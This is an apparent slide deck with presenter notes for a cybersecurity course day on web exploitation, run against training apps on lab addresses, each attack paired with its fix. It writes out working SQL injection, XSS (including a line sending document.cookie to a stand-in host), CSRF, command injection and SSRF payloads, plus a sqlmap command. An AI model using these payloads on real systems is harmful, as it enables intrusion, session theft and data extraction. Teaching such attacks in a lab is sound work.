---
marp: true
theme: dark-monospace
paginate: true
title: "Day 16 — Web Exploitation"
footer: "Practical Cyber Security (v2) · Week 4 · Day 16"
---

<!-- _class: lead -->

# Web exploitation
## Day 16 — Every web bug is "untrusted input reached something powerful"

**Week 4 · Applying it, and choosing a direction**

<!--
RUN SHEET (~85 min). Hands-on heavy. DVWA at "low" then "medium"; Juice Shop.
00:00 Journey check + hook (SQLi login bypass, live)           4
00:04 How a web app works + the tools (DevTools / Burp)        7
00:11 The OWASP Top 10 — the shape                             5
00:16 #1 Injection / SQLi — the mechanism                     11
00:27 DO: SQLi — login bypass + UNION extract                 12
00:39 #2 XSS — reflected / stored / DOM                       10
00:49 DO: stored XSS                                          10
00:59 #3 Broken access control / IDOR                          7
01:06 #4 & #5 — broken auth/session, SSRF                      5
01:11 Attack <-> defence — the one pattern                     4
01:15 Trap + wrap + homework                                   5
CUT FIRST IF SHORT: step 4 (sqlmap) of the SQLi DO — narrate/demo it yourself in 60s instead of
having everyone run it; the SSRF half of #4-5; the Burp demo to 2 min; DOM XSS detail.
NEVER CUT: the injection mechanism + the SQLi DO, XSS + the stored-XSS DO, IDOR, the
"parameterize don't filter" trap, the find/prove/fix artifact.
ANALOGY (kitchen): untrusted input = an order ticket. If the kitchen blindly does whatever the
ticket says ("table 4: two pastas AND unlock the safe"), that's injection. A parameterized
query = an order form with fixed fields — the customer fills VALUES, never instructions.
ETHICS: DVWA / Juice Shop on <LAB_HOST> only (the ROE). These apps are built to be attacked.
Own lab: DVWA `10.89.1.20`, Juice Shop `10.89.1.30` — see the Day 13 teacher-notes lab tool map.
-->

---

## Where we are

- **Week 3:** you ran the pentest lifecycle on services.
- **This week:** what attackers do *next*, how defenders catch them, AI, and your career path.
- **Today:** **web** — the most common attack surface — the OWASP Top 10, hands-on, with the fix for each.

<!--
Journey Check. Week 4 opens. Today is the most hands-on day of the course. Callback to Day 10:
"where does data from outside cross into somewhere powerful?" — today we walk through the door.
-->

---

## Hook — one quote mark

*(projector, DVWA or Juice Shop login)*

```
Username:  admin' --
Password:  (anything)
```

→ **Logged in as admin. No password.**

That `'` broke out of the app's SQL query. Today: why, and how to make it impossible.

<!--
Do it live. The `--` comments out the rest of the query (the password check). Let it land.
"The app trusted your input inside a command. That's the whole day."
-->

---

## How a web app works — and the tools

```
browser  --request-->  server code  -->  database / filesystem / other services
         <--response--              <--
```

Every **arrow** is a place your input can reach something powerful. (Day 10: the trust boundary.)

**Your tools:**
- **DevTools** (F12 → Network) — you know this (Day 4). See every request/response.
- **Burp Suite** — an intercepting proxy: catch a request, **change it**, forward it. The pro tool.
- **`curl`** — scripted requests, no browser.

<!--
Burp 2-min version: Proxy tab -> Intercept on -> browse -> the request pauses -> edit any
field -> Forward. Or "send to Repeater" to replay + tweak. That's 80% of web testing.
DVWA/Juice Shop are deliberately vulnerable training apps - attacking them is the point.
-->

---

## The OWASP Top 10 — the shape

A list, refreshed ~every 4 years, of the categories that **actually cause breaches**
(this is the 2021 set; a 2025 revision is in progress):

1. **Broken Access Control**   2. Cryptographic Failures   3. **Injection**
4. Insecure Design   5. Security Misconfiguration   6. Vulnerable Components
7. **Auth Failures**   8. Integrity Failures   9. Logging Failures   10. **SSRF**

We drill the **5 you'll meet most**: Injection (SQLi), XSS, Broken Access Control / IDOR,
Auth/Session, SSRF.

<!--
It's not a checklist to memorise - it's "these are where the money is". Broken Access Control
is #1 because it's everywhere and scanners miss it (it needs logic understanding).
XSS lives under "Injection" in the current list but we teach it separately - it behaves differently.
-->

---

## #1 Injection — SQLi: the mechanism

The app builds a query by **gluing your input into a string**:

```
"SELECT * FROM users WHERE name='" + input + "' AND pass='" + pw + "'"
```

You send `input = admin' --` →

```
SELECT * FROM users WHERE name='admin' -- ' AND pass='...'
```

The `'` ends the string; `--` comments out the rest. **Your data became code.**

<!--
Three flavours:
- Login bypass: `' OR '1'='1' -- `
- UNION extract: `' UNION SELECT username, password FROM users -- ` (pull data into the page)
- Blind: no output, but the page behaves differently for true vs false, or you time it
  (`' OR SLEEP(5) -- `)
-->

---

## SQLi — find / prove / fix

- **Find:** put a `'` in a field or URL param. Error? Different result? Login works oddly? →
  it's probably injectable.
- **Prove:** extract data you shouldn't see — `' UNION SELECT user,password FROM users -- `.
- **Fix:** **parameterized queries** (prepared statements). The query structure is fixed; input
  is bound as a **value**, never parsed as SQL:
  ```
  db.execute("SELECT * FROM users WHERE name=? AND pass=?", [name, pw])
  ```

<!--
The fix makes injection STRUCTURALLY IMPOSSIBLE - the DB driver keeps code and data separate.
This is the Day 16 trap, previewed: you do NOT fix injection by filtering out `'` and `--`.
ORMs parameterize by default. Stored procedures help but aren't automatic.
-->

---

## Do it now — SQLi

In DVWA (`10.89.1.20`, SQL Injection page, security = low) or Juice Shop (`10.89.1.30`) login:

1. **Login bypass:** username `admin' --` (DVWA: `' or '1'='1`) → in without a password.
2. **Extract:** in the DVWA SQLi box, `1' UNION SELECT user, password FROM users -- -`
   → dump the users table (hashes — Day 5!).
3. Bump DVWA to **security = medium** and see what still works (and what doesn't).
4. **Now automate it:** `sqlmap -u "http://10.89.1.20/vulnerabilities/sqli/?id=1&Submit=Submit" --cookie="security=low; PHPSESSID=<yours>" --dbs` — same bug, found and mapped in seconds.
   You do step 4 only *after* 1-3, once you know why it works — a tool that finds bugs you
   don't understand just gives you output you can't defend.

Screenshot each. Note which payload worked at which security level.

<!--
12 min. Juice Shop login: email `' OR 1=1--`, any password -> admin. The password column is
MD5/bcrypt hashes -> callback to Day 5 (now go crack them with your Day 5 crack.py, optional).
"medium" adds some escaping - show that a determined payload still gets through, reinforcing
"filtering isn't the fix".
-->

---

## #2 XSS — your input runs in someone's browser

Your input is put into the page, and the browser **executes it as HTML/JS**:

| Type | Where | Who it hits |
|---|---|---|
| **Reflected** | in a URL parameter, echoed back | one victim you send the link to |
| **Stored** | saved (a comment, profile, review) | **everyone who views it** |
| **DOM** | client-side JS mishandles input | varies |

**Impact:** steal the **session cookie** (Day 4 — you *become* them), keylog, redirect, act as the user.

<!--
"XSS is just alert() popups" is the trap here. alert() is the PROOF; the real payload steals
`document.cookie` and sends it to the attacker, or does actions as the logged-in user.
Stored XSS in an admin panel = game over.
-->

---

## XSS — find / prove / fix

- **Find:** submit `<b>test</b>` or `<i>x</i>`. Does it render **bold/italic**? Then HTML
  isn't being encoded.
- **Prove:** `<script>alert(document.cookie)</script>` — or exfiltrate:
  `<script>new Image().src='//me/c?'+document.cookie</script>`
- **Fix (all three):**
  1. **context-aware output encoding** — `<` becomes `&lt;` *for the context it's rendered in*
  2. a **Content-Security-Policy** header — blocks inline scripts even if one slips in
  3. **HttpOnly** cookies — JavaScript can't read the session cookie

<!--
Encoding is context-dependent: HTML body vs an attribute vs inside a <script> vs a URL each
need different encoding. Frameworks (React, Angular) auto-encode in templates - which is why
"just use the framework's templating" is good advice.
-->

---

## Do it now — stored XSS

In DVWA (`10.89.1.20`, XSS Stored, security = low) or Juice Shop (`10.89.1.30`):

1. In a comment / feedback / name field, submit:
   `<script>alert(document.cookie)</script>`
2. **Reload the page** (or open it as "another user") — the script fires **without you doing
   anything**. That's *stored* — it hits every viewer.
3. Try `<img src=x onerror=alert(1)>` — works even when `<script>` is filtered.

<!--
10 min. The reload is the "aha" - the payload is now part of the page for everyone.
`<img onerror>` shows why blocklisting `<script>` doesn't work - there are dozens of ways to
run JS. Reinforces the trap again.
-->

---

## #3 Broken access control / IDOR

The app checks **authentication** ("are you logged in?") but not **authorization** ("are you
allowed *this* record?").

```
GET /account?id=1001      <- your account
GET /account?id=1002      <- ...someone else's, and it loads
```

Also: browsing straight to `/admin`, changing `role=user` to `role=admin` in a request.

- **Find:** change an ID, a path, a hidden field.
- **Prove:** see or change data that isn't yours.
- **Fix:** a **server-side authorization check on every request** — "does *this* user own *this*
  object?" Never trust the client to enforce it.

**Try it now (3 min):** in Juice Shop, log in, add an item to your basket, watch the
`/rest/basket/<id>` call in DevTools → change `<id>` → someone else's basket. Screenshot.

<!--
This is OWASP #1 and scanners can't find it - it needs understanding of what SHOULD be allowed.
"It requires a login, so it's fine" is the trap: logged-in != authorised for that specific thing.
DVWA has little IDOR - Juice Shop is the target for this one. Borrow the 3 min from #4-5 if needed.
-->

---

## #4 & #5 — quickly

**Broken authentication / session**
- weak passwords, no lockout, predictable/again-usable tokens, session not killed on logout,
  password reset flaws.
- **Fix:** MFA, lockout/rate-limit, cryptographically random tokens, `Secure`+`HttpOnly`+`SameSite`,
  invalidate on logout.

**SSRF — Server-Side Request Forgery**
- you give the app a URL ("import from this link"), it **fetches it server-side** → point it at
  `http://localhost/admin` or the cloud metadata service `169.254.169.254`.
- **Fix:** allowlist destinations, block internal IP ranges, don't take raw URLs from users.

<!--
5 min total. SSRF matters more in Week 4's cloud context (Day 17) - metadata endpoints hand
out credentials. CUT SSRF first if short.
-->

---

## Bonus — two more you'll see everywhere

**CSRF — Cross-Site Request Forgery.** Your browser attaches cookies to a request
**automatically**, no matter which site the request came from. A malicious page can silently
submit a request to a site you're logged into, and your session cookie rides along:

```
<img src="https://bank.example/transfer?to=attacker&amount=1000">
```

If that link moves money and you're logged into the bank, just *viewing* the attacker's page
does it for you — no click, no password prompt.
- **Fix:** anti-CSRF tokens (a per-session secret the form must echo back), `SameSite=Lax`
  cookies, re-auth for sensitive actions.

**Command Injection.** The app passes your input straight into a shell command:

```
os.system(f"ping -c 1 {user_input}")
```

Input `8.8.8.8; cat /etc/passwd` → two commands run. Same trust-boundary bug as SQLi — text you
typed became a command — just a shell instead of a database.
- **Fix:** never build shell strings from input — call the library function directly
  (`subprocess.run(["ping", "-c", "1", host])`, no `shell=True`), or a strict allowlist.

<!--
OPTIONAL slide — cut first if short, or assign as homework reading. Same "your data became
code" pattern as the SQLi slide; students should recognise it immediately.
DVWA (`10.89.1.20`) has a Command Injection page and a CSRF page — good for extra practice
beyond today's three DOs. Command Injection there is also the door Day 17 walks through: a
shell via a web bug, then a backdoor for persistence — same target, later stage.
-->

---

## Attack ↔ Defence — it's one pattern

**Every** vuln today: *untrusted input reached something powerful because it wasn't checked at
the boundary.*

| Vuln | The fix (structural) | A WAF... |
|---|---|---|
| SQLi | parameterized queries | catches common payloads — **not the fix** |
| XSS | output encoding + CSP | catches `<script>` — bypassable |
| IDOR | server-side authorization | can't see it at all |
| SSRF | destination allowlist | limited help |
| CSRF | anti-CSRF token + `SameSite` | doesn't see it — it's a valid-looking request |
| Command injection | no shell string-building | catches known payloads — bypassable |

**A WAF is defence in depth. The code is the fix.**

<!--
Show a WAF/app log line for a blocked SQLi attempt next to the one-line code fix. The WAF buys
time; it doesn't remove the bug. Devs who "rely on the WAF" ship the vuln.
-->

---

## The trap

> "We validate input — we strip out `'`, `<`, `script`, `--`."

**That does not fix injection or XSS.** Attackers bypass filters endlessly: encoding
(`%27`, `&#39;`), case (`ScRiPt`), alternate syntax (`<img onerror>`), Unicode, double-encoding.

**The fix is structural:** parameterized queries make SQLi *impossible*. Output encoding makes
XSS *impossible*. Filtering just makes it *harder for lazy attackers*.

<!--
Input validation is still good practice (reject a 5000-char "name") - just not as the security
control for injection. The structural fix + validation + a WAF = defence in depth.
-->

---

## Today's attack / defence / artifact

- **Attack:** find where input hits a query / the DOM / an auth check without a boundary check;
  prove it by extracting data or running code or reading another user's records.
- **Defence:** parameterize, encode (+ CSP), authorize server-side, allowlist — **at the boundary,
  in the code.** A WAF is a bonus layer, not the fix.
- **Artifact:** **"5 web vulns: find / prove / fix"** — one row per vuln, with **your own
  screenshots** of the proof (`day16/web-vulns.md`).

---

## Homework

1. Complete `day16/web-vulns.md` — the **find / prove / fix** table for **all 5** vuln classes,
   each with a screenshot of your proof from the lab. Commit it.
2. For **SQLi and XSS**, write the **one-line code fix** (parameterized query; output encoding)
   in the language of your choice.
3. `assets/vuln-code.md` — read the two vulnerable snippets; rewrite each the safe way.
4. Add `SQL injection`, `parameterized query`, `XSS (reflected/stored/DOM)`, `output encoding`,
   `CSP`, `IDOR`, `authorization vs authentication`, `SSRF`, `WAF`, `CSRF`, `command injection`
   to your glossary.
5. *(Optional, extra practice)* DVWA's **CSRF** and **Command Injection** pages — same
   find/prove/fix approach as today's three DOs.

<!--
Due start of Day 17.
-->

---

<!-- _class: lead -->

## Recap

1. **Every web bug is the same bug:** untrusted input reached something powerful without a check at the boundary.
2. **Fix it structurally:** parameterize queries, encode output (+ CSP), authorize server-side. Not by filtering.
3. **XSS steals sessions. IDOR ignores logins. A WAF is a layer, not a fix.**

<!--
Say the three lines. Tomorrow: what an attacker does AFTER getting in - post-exploitation,
privilege escalation, persistence, pivoting - and then the infrastructure and cloud side.
-->
